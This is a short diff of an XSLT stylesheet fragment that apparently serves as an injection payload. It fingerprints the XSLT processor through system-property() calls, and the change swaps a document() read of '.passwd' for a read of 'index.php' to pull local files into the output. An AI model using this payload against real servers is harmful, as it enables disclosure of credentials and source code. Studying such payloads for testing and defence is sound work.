@@ -15,7 +15,7 @@
 	<xsl:value-of select="system-property('xsl:version')"/><br>
 	<xsl:value-of select="system-property('xsl:vendor')"/><br>
 	<xsl:value-of select="system-property('xsl:vendor-url')"/><br>
-	<xsl:value-of select="document('.passwd')"/>
+	<xsl:value-of select="document('index.php')"/>
     </p>
   </div>
 </xsl:for-each>
